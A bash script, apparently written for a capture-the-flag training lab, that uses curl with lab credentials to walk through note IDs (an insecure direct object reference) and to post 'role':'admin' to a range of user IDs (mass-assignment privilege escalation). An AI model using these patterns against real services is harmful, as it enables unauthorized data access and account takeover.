#!/bin/bash

# curl(1) command with cookie handling
curlCmd="curl -b ./cookie -c ./cookie"
gimmiJson='Content-Type: application/json'

serverAddr="774b2d42-b4ba-4162-9b2e-0bfd5c9a3448.idocker.vuln.land"
loginUrl="https://$serverAddr/api/login"
noteUrl="https://$serverAddr/api/note"
userUrl="https://$serverAddr/api/user"

# Search notes: the secondary arg is the upper limit for note-id
if [ "$1" = "searchNote" ]; then
    upperLimitId=$2
    echo "Login ..."
    $curlCmd -X POST $loginUrl -H "$gimmiJson" -d '{"username":"leeloo","password":"multi"}'
    printf '\n\n'  # Fixes missing linefeed
    
    echo "Search Note ..."
    for i in $(seq 0 $upperLimitId); do
        $curlCmd $noteUrl/$i -H "$gimmiJson"
        printf '\n'
    done
    printf '\n'
    exit 0
fi

# Search users: the secondary arg is the upper limit for user-id
if [ "$1" = "searchUser" ]; then
    upperLimitId=$2
    echo "Login ..."
    $curlCmd -X POST $loginUrl -H "$gimmiJson" -d '{"username":"leeloo","password":"pass"}'
    printf '\n\n' 

    echo "Search other user ids ..."
    for i in $(seq 1330 $upperLimitId); do
        $curlCmd -X POST $userUrl/$i -H "$gimmiJson" -d '{"id":0,"username":"leeloo","password":"pass","role":"admin"}'
        printf '\n'
    done
    printf '\n'
    exit 0
fi

# Manual POST: $1='post', $2=<path>, $3=<JSON>
if [ "$1" = "post" ]; then
    $curlCmd -L -X POST https://$serverAddr/$2 -H "$gimmiJson" -d "$3"
    printf '\n'
    exit 0
fi

# Manual GET: $1=<path>
$curlCmd -L https://$serverAddr/$1
printf '\n'
